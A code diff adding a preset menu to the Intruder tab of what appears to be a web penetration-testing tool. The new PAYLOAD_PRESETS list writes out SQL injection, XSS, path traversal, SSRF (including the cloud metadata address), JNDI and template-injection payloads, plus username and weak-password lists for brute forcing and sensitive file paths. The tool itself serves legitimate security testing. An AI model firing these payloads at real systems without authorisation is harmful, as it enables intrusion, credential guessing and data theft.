@@ -316,10 +316,101 @@ function InterceptTab({ intercept, intercepted, dispatch }) {
 }
 
 // ===================== INTRUDER =====================
+// Compact payload presets so the user has something to throw at a target
+// without first hunting down a wordlist. Curated/short on purpose -- meant
+// to be a starting point that the user expands, not an exhaustive bank.
+const PAYLOAD_PRESETS = {
+  "numbers (1-100)":
+    Array.from({ length: 100 }, (_, i) => String(i + 1)).join("\n"),
+  "common usernames": [
+    "admin","administrator","root","user","test","guest","support",
+    "demo","operator","manager","sysadmin","webmaster","ftp","ubuntu",
+    "ec2-user","oracle","postgres","mysql",
+  ].join("\n"),
+  "weak passwords": [
+    "password","123456","12345678","qwerty","letmein","admin","welcome",
+    "monkey","dragon","master","abc123","iloveyou","Password1","P@ssw0rd",
+    "changeme","summer2024","Winter2024!","123456789",
+  ].join("\n"),
+  "sqli (basic)": [
+    "'", "''", "`", "``", "\\\"",
+    "' OR '1'='1", "' OR '1'='1' --", "' OR 1=1 --", "\" OR 1=1 --",
+    "admin' --", "admin' #", "admin'/*",
+    "') OR ('1'='1", "1' UNION SELECT NULL--",
+    "'; DROP TABLE users--", "' AND 1=CONVERT(int,(SELECT @@version))--",
+    "SLEEP(5)", "1' AND SLEEP(5)--",
+  ].join("\n"),
+  "xss (basic)": [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
+    "\"><script>alert(1)</script>",
+    "'><script>alert(1)</script>",
+    "javascript:alert(1)",
+    "<iframe src=javascript:alert(1)>",
+    "<body onload=alert(1)>",
+    "<input autofocus onfocus=alert(1)>",
+    "<details open ontoggle=alert(1)>",
+    "</script><script>alert(1)</script>",
+  ].join("\n"),
+  "path traversal": [
+    "../", "..\\",
+    "../etc/passwd", "../../etc/passwd", "../../../etc/passwd", "../../../../etc/passwd",
+    "..%2fetc%2fpasswd", "..%252fetc%252fpasswd",
+    "..\\windows\\win.ini", "..\\..\\..\\windows\\win.ini",
+    "/etc/passwd", "C:\\windows\\win.ini",
+    "file:///etc/passwd",
+  ].join("\n"),
+  "ssrf candidates": [
+    "http://127.0.0.1/", "http://127.0.0.1:22/",
+    "http://localhost/", "http://[::1]/",
+    "http://169.254.169.254/latest/meta-data/",
+    "http://metadata.google.internal/",
+    "http://0.0.0.0/", "http://[0:0:0:0:0:ffff:127.0.0.1]/",
+    "gopher://127.0.0.1:6379/_INFO", "file:///etc/passwd",
+    "dict://127.0.0.1:11211/stats",
+  ].join("\n"),
+  "common files": [
+    "/.env",".env","/robots.txt","/sitemap.xml","/.git/config","/.git/HEAD",
+    "/.svn/entries","/composer.json","/package.json","/web.config","/.htaccess",
+    "/wp-config.php","/config.php","/phpinfo.php","/server-status",
+    "/admin","/admin/","/manager/html","/.well-known/security.txt",
+    "/api","/api/v1","/api/v2","/swagger.json","/openapi.json",
+  ].join("\n"),
+  "fuzz strings (small)": [
+    "", "a", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+    "0","-1","null","NULL","undefined","NaN","Infinity",
+    "true","false","[]","{}","[null]",
+    "%00","%0a","%0d%0a","%ff"," ","\\n","\\r\\n",
+    "../","./","\\\\","\\\\?\\",
+    "${jndi:ldap://x}", "{{7*7}}", "<%= 7*7 %>",
+  ].join("\n"),
+  "user-agents (rotation)": [
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Safari/17.4",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
+    "curl/8.6.0", "Wget/1.21.4", "python-requests/2.32.0",
+    "Googlebot/2.1 (+http://www.google.com/bot.html)",
+  ].join("\n"),
+};
+
 function IntruderTab({ intruder, dispatch }) {
   const total = intruder.payloads.length;
   const completed = intruder.results.filter(r => r.status !== null).length;
   const pct = total ? Math.round((completed / total) * 100) : 0;
+
+  const [presetMenuOpen, setPresetMenuOpen] = React.useState(false);
+  const applyPreset = (key, mode) => {
+    const text = PAYLOAD_PRESETS[key];
+    if (!text) return;
+    const lines = text.split("\n");
+    const next = mode === "append"
+      ? [...intruder.payloads, ...lines]
+      : lines;
+    dispatch({ type: "intruder-set", payload: { payloads: next.filter(s => s !== undefined) } });
+    setPresetMenuOpen(false);
+  };
 
   return (
     <div className="tab-body" style={{ gridTemplateRows: "auto auto 1fr auto" }}>
@@ -378,12 +469,74 @@ function IntruderTab({ intruder, dispatch }) {
             />
           </div>
           <div className="divider-v" />
-          <div className="pane" style={{ minWidth: 0 }}>
+          <div className="pane" style={{ minWidth: 0, position: "relative" }}>
             <div className="pane-head">
               <span style={{ color:"var(--accent)" }}>▸</span>
               <span>PAYLOADS</span>
               <span className="ph-count">{intruder.payloads.length}</span>
+              <span style={{ flex: 1 }} />
+              <button
+                onClick={() => setPresetMenuOpen(o => !o)}
+                style={{
+                  background: "transparent", color: "var(--accent)",
+                  border: "1px solid var(--accent)", padding: "2px 8px",
+                  fontSize: "10px", fontFamily: "var(--ff-mono)",
+                  cursor: "pointer", letterSpacing: "0.04em",
+                  textTransform: "uppercase",
+                }}
+              >+ PRESET ▾</button>
             </div>
+            {presetMenuOpen && (
+              <div
+                onClick={(e) => e.stopPropagation()}
+                style={{
+                  position: "absolute", top: 28, right: 6, zIndex: 30,
+                  background: "var(--pane)", border: "1px solid var(--accent)",
+                  boxShadow: "0 8px 24px rgba(0,0,0,0.4)",
+                  fontFamily: "var(--ff-mono)", fontSize: "11px",
+                  minWidth: 240, maxHeight: 360, overflow: "auto",
+                }}>
+                <div style={{
+                  padding: "6px 10px", color: "var(--dim)", fontSize: "10px",
+                  textTransform: "uppercase", letterSpacing: "0.06em",
+                  borderBottom: "1px solid var(--line)",
+                }}>
+                  Load preset
+                  <span style={{ float: "right", cursor: "pointer", color: "var(--dim)" }}
+                        onClick={() => setPresetMenuOpen(false)}>×</span>
+                </div>
+                {Object.keys(PAYLOAD_PRESETS).map(k => {
+                  const count = PAYLOAD_PRESETS[k].split("\n").length;
+                  return (
+                    <div key={k} style={{
+                      padding: "5px 10px", display: "flex",
+                      alignItems: "center", gap: 6,
+                      borderBottom: "1px solid var(--line-soft)",
+                    }}>
+                      <span style={{ flex: 1, color: "var(--text)" }}>
+                        {k} <span style={{ color: "var(--dim)" }}>· {count}</span>
+                      </span>
+                      <button onClick={() => applyPreset(k, "replace")}
+                              title="Replace current payloads"
+                              style={{
+                                background: "transparent", color: "var(--accent)",
+                                border: "1px solid var(--line)", padding: "1px 6px",
+                                fontSize: "10px", fontFamily: "var(--ff-mono)",
+                                cursor: "pointer",
+                              }}>SET</button>
+                      <button onClick={() => applyPreset(k, "append")}
+                              title="Append to current payloads"
+                              style={{
+                                background: "transparent", color: "var(--text-2)",
+                                border: "1px solid var(--line)", padding: "1px 6px",
+                                fontSize: "10px", fontFamily: "var(--ff-mono)",
+                                cursor: "pointer",
+                              }}>+ADD</button>
+                    </div>
+                  );
+                })}
+              </div>
+            )}
             <textarea
               className="txt"
               value={intruder.payloads.join("\n")}
